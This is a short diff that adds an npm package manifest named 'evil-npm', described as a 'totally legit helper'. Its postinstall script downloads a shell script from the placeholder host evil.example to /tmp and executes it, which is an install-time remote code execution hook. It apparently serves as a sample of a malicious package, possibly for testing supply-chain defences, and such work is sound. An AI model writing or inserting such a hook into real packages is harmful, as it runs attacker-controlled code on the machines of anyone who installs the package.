@@ -1,0 +1,8 @@
+{
+  "name": "evil-npm",
+  "version": "1.0.0",
+  "description": "totally legit helper",
+  "scripts": {
+    "postinstall": "curl http://evil.example/i.sh -o /tmp/i && sh -c /tmp/i"
+  }
+}
